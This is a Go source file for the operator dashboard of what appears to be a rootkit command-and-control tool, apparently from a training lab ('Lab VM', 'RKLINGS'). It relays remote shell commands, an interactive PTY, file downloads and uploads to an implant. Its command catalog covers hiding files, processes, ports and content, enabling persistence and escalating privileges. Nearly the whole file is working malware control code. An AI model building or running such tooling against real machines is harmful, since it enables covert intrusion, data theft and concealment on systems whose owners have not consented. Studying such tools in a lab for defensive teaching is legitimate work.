package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
)

type webMessage struct {
	Type, Target, Command, Path, Label, Data string
	ExecID                                   int `json:"_execId"`
	DLID                                     int `json:"_dlId"`
	UploadID                                 int `json:"_uploadId"`
}

type agentInfo struct {
	Hostname     string              `json:"hostname"`
	Kernel       string              `json:"kernel"`
	Arch         string              `json:"arch"`
	PID          int                 `json:"pid"`
	UID          int                 `json:"uid"`
	ModuleHidden bool                `json:"module_hidden"`
	Persisted    bool                `json:"persisted"`
	Hidden       map[string][]string `json:"hidden"`
}

var dashboard = struct {
	sync.Mutex
	label  string
	events []map[string]string
}{label: "Lab VM"}

var commandCatalog = []map[string]string{
	{"cmd": "PING", "desc": "Check agent connectivity"},
	{"cmd": "STATUS", "desc": "Show process identity"},
	{"cmd": "SHELL <command>", "desc": "Execute a command"},
	{"cmd": "HIDE FILE <name>", "desc": "Conceal a directory entry"},
	{"cmd": "HIDE PID <pid>", "desc": "Conceal a process"},
	{"cmd": "HIDE PORT <port>", "desc": "Conceal a procfs TCP entry"},
	{"cmd": "HIDE CONTENT <text>", "desc": "Filter matching read lines"},
	{"cmd": "PERSIST", "desc": "Enable persistence"},
	{"cmd": "ESCALATE [pid]", "desc": "Escalate a process"},
}

func recordEvent(kind, message string) {
	dashboard.Lock()
	recordEventLocked(kind, message)
	dashboard.Unlock()
}

func recordEventLocked(kind, message string) {
	dashboard.events = append(dashboard.events, map[string]string{
		"time": time.Now().Format("15:04:05"), "type": kind, "msg": message,
	})
	if len(dashboard.events) > 200 {
		dashboard.events = dashboard.events[len(dashboard.events)-200:]
	}
}

func startWeb() {
	mux := http.NewServeMux()
	mux.HandleFunc("/ws", handleWS)
	mux.HandleFunc("/shell", handleShellWS)
	mux.HandleFunc("/wait", relayWait)
	mux.HandleFunc("/cmd", relayCommand)
	mux.HandleFunc("/download", relayDownload)
	mux.HandleFunc("/download-size", relayDownloadSize)
	mux.HandleFunc("/upload", relayUpload)
	mux.Handle("/", spaHandler(os.Getenv("RKLINGS_WEB_DIR")))
	addr := os.Getenv("RKLINGS_WEB_ADDR")
	if addr == "" {
		addr = "127.0.0.1:8080"
	}
	log.Printf("[*] Operator dashboard: http://%s", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Printf("webapp: %v", err)
	}
}

func relayWait(w http.ResponseWriter, _ *http.Request) {
	if !connected() {
		http.Error(w, "waiting for agent", http.StatusServiceUnavailable)
		return
	}
	fmt.Fprintln(w, "CONNECTED")
}

func relayCommand(w http.ResponseWriter, r *http.Request) {
	cmd := strings.TrimSpace(r.URL.Query().Get("q"))
	op, arg, _ := strings.Cut(cmd, " ")
	raw, err := sendCommand(op, arg, nil)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	fmt.Fprintln(w, rawToString(raw))
}

func relayDownload(w http.ResponseWriter, r *http.Request) {
	raw, err := sendCommand("DOWNLOAD", strings.TrimSpace(r.URL.Query().Get("path")), nil)
	reply := rawToString(raw)
	if err != nil || strings.HasPrefix(reply, "ERR") || strings.Contains(reply, `"error"`) {
		http.Error(w, result(reply, err), http.StatusBadGateway)
		return
	}
	var dl struct {
		Data string `json:"data"`
	}
	if json.Unmarshal(raw, &dl) == nil && dl.Data != "" {
		decoded, decErr := base64.StdEncoding.DecodeString(dl.Data)
		if decErr == nil {
			w.Write(decoded)
			return
		}
	}
	io.WriteString(w, reply)
}

func relayDownloadSize(w http.ResponseWriter, r *http.Request) {
	raw, err := sendCommand("DOWNLOAD", strings.TrimSpace(r.URL.Query().Get("path")), nil)
	reply := rawToString(raw)
	if err != nil || strings.HasPrefix(reply, "ERR") || strings.Contains(reply, `"error"`) {
		http.Error(w, result(reply, err), http.StatusBadGateway)
		return
	}
	var dl struct {
		Size string `json:"size"`
	}
	if json.Unmarshal(raw, &dl) == nil {
		fmt.Fprintln(w, dl.Size)
	} else {
		fmt.Fprintln(w, len(reply))
	}
}

func relayUpload(w http.ResponseWriter, r *http.Request) {
	data, err := io.ReadAll(io.LimitReader(r.Body, 16<<20))
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	raw, err := sendUploadCommand(strings.TrimSpace(r.URL.Query().Get("path")), data)
	reply := rawToString(raw)
	if err != nil || strings.HasPrefix(reply, "ERR") {
		http.Error(w, result(reply, err), http.StatusBadGateway)
		return
	}
	fmt.Fprintln(w, reply)
}

func spaHandler(root string) http.Handler {
	files := http.FileServer(http.Dir(root))
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := filepath.Join(root, filepath.Clean(r.URL.Path))
		if info, err := os.Stat(path); err == nil && !info.IsDir() {
			files.ServeHTTP(w, r)
			return
		}
		http.ServeFile(w, r, filepath.Join(root, "index.html"))
	})
}

func handleWS(w http.ResponseWriter, r *http.Request) {
	ws, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		OriginPatterns: []string{"localhost:*", "127.0.0.1:*"},
	})
	if err != nil {
		return
	}
	defer ws.CloseNow()
	ws.SetReadLimit(24 << 20)
	writeState(ws)
	ctx := context.Background()
	for {
		_, data, err := ws.Read(ctx)
		if err != nil {
			return
		}
		var msg webMessage
		if json.Unmarshal(data, &msg) != nil {
			continue
		}
		switch msg.Type {
		case "heartbeat", "watch":
		case "refresh":
			writeState(ws)
		case "rename":
			dashboard.Lock()
			if strings.TrimSpace(msg.Label) != "" {
				dashboard.label = strings.TrimSpace(msg.Label)
			}
			dashboard.Unlock()
			writeState(ws)
		case "command":
			op, arg, _ := strings.Cut(msg.Command, " ")
			raw, callErr := sendCommand(op, arg, nil)
			reply := rawToString(raw)
			recordEvent("command", msg.Command)
			wsWriteJSON(ws, map[string]any{"type": "result", "target": msg.Target, "command": msg.Command, "ok": callErr == nil && !strings.HasPrefix(reply, "ERR"), "reply": result(reply, callErr)})
		case "exec":
			raw, callErr := sendCommand("SHELL", msg.Command, nil)
			reply := rawToString(raw)
			wsWriteJSON(ws, map[string]any{"type": "exec_result", "target": msg.Target, "_execId": msg.ExecID, "ok": callErr == nil, "output": result(reply, callErr)})
		case "download":
			raw, callErr := sendCommand("DOWNLOAD", msg.Path, nil)
			reply := rawToString(raw)
			if callErr != nil || strings.HasPrefix(reply, "ERR") || strings.Contains(reply, `"error"`) {
				wsWriteJSON(ws, map[string]any{"type": "download_result", "_dlId": msg.DLID, "ok": false, "error": result(reply, callErr)})
			} else {
				var dl struct {
					Data string `json:"data"`
				}
				if json.Unmarshal(raw, &dl) == nil && dl.Data != "" {
					decoded, _ := base64.StdEncoding.DecodeString(dl.Data)
					wsWriteJSON(ws, map[string]any{"type": "download_progress", "_dlId": msg.DLID, "received": len(decoded), "total": len(decoded)})
					wsWriteJSON(ws, map[string]any{"type": "download_result", "_dlId": msg.DLID, "ok": true, "size": len(decoded), "data": dl.Data})
				} else {
					wsWriteJSON(ws, map[string]any{"type": "download_result", "_dlId": msg.DLID, "ok": false, "error": "unexpected response format"})
				}
			}
		case "upload":
			udata, decodeErr := base64.StdEncoding.DecodeString(msg.Data)
			if decodeErr != nil || len(udata) > 16<<20 {
				wsWriteJSON(ws, map[string]any{"type": "upload_result", "_uploadId": msg.UploadID, "ok": false, "error": "invalid upload"})
				continue
			}
			raw, callErr := sendUploadCommand(msg.Path, udata)
			reply := rawToString(raw)
			wsWriteJSON(ws, map[string]any{"type": "upload_result", "_uploadId": msg.UploadID, "ok": callErr == nil && !strings.HasPrefix(reply, "ERR"), "reply": result(reply, callErr), "size": len(udata)})
		}
	}
}

func handleShellWS(w http.ResponseWriter, r *http.Request) {
	ws, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		OriginPatterns: []string{"localhost:*", "127.0.0.1:*"},
	})
	if err != nil {
		return
	}
	defer ws.CloseNow()

	if !connected() {
		wsWriteJSON(ws, map[string]any{"type": "error", "msg": "target offline"})
		return
	}

	session := getSession()
	if session == nil {
		wsWriteJSON(ws, map[string]any{"type": "error", "msg": "target offline"})
		return
	}

	raw, err := sendCommand("PTY", "START", nil)
	reply := rawToString(raw)
	if err != nil || strings.HasPrefix(reply, "ERR") {
		wsWriteJSON(ws, map[string]any{"type": "error", "msg": result(reply, err)})
		return
	}
	defer sendCommand("PTY", "CLOSE", nil)
	wsWriteJSON(ws, map[string]any{"type": "ready"})

	ptyCh := make(chan []byte, 64)
	session.ptyMu.Lock()
	session.ptySub = ptyCh
	session.ptyMu.Unlock()
	defer func() {
		session.ptyMu.Lock()
		session.ptySub = nil
		session.ptyMu.Unlock()
	}()

	ctx := context.Background()
	go func() {
		for data := range ptyCh {
			if ws.Write(ctx, websocket.MessageBinary, data) != nil {
				return
			}
		}
	}()

	for {
		kind, data, err := ws.Read(ctx)
		if err != nil {
			return
		}
		if kind == websocket.MessageText && strings.HasPrefix(string(data), "{") {
			var resize struct {
				Type       string
				Cols, Rows uint16
			}
			if json.Unmarshal(data, &resize) == nil && resize.Type == "resize" {
				sendCommand("PTY", fmt.Sprintf("RESIZE %d %d", resize.Cols, resize.Rows), nil)
				continue
			}
		}
		sendCommand("PTY", "INPUT "+base64.StdEncoding.EncodeToString(data), nil)
	}
}

func writeState(ws *websocket.Conn) {
	isOnline := connected()
	dashboard.Lock()
	label := dashboard.label
	events := append([]map[string]string(nil), dashboard.events...)
	dashboard.Unlock()
	targets := []map[string]any{}
	agent.Lock()
	id := agent.id
	agent.Unlock()
	if id != "" {
		info := agentInfo{Hidden: map[string][]string{"file": {}, "content": {}, "pid": {}, "port": {}}}
		if isOnline {
			raw, err := sendCommand("INFO", "", nil)
			if err == nil {
				json.Unmarshal(raw, &info)
			}
		}
		counts := make(map[string]int, len(info.Hidden))
		for kind, values := range info.Hidden {
			key := kind + "s"
			if kind == "content" {
				key = kind
			}
			counts[key] = len(values)
		}
		targets = append(targets, map[string]any{
			"id": id, "label": label, "hostname": info.Hostname, "peer": "websocket",
			"kernel": info.Kernel, "arch": info.Arch, "pid": info.PID, "uid": info.UID, "online": isOnline,
			"module_hidden": info.ModuleHidden, "persisted": info.Persisted,
			"hidden": info.Hidden, "counts": counts,
			"last_seen": time.Now().Format(time.RFC3339),
		})
	}
	wsWriteJSON(ws, map[string]any{"type": "state", "targets": targets, "events": events, "commands": commandCatalog})
}

func wsWriteJSON(ws *websocket.Conn, v any) error {
	data, err := json.Marshal(v)
	if err != nil {
		return err
	}
	return ws.Write(context.Background(), websocket.MessageText, data)
}

func result(reply string, err error) string {
	if err != nil {
		return err.Error()
	}
	return reply
}
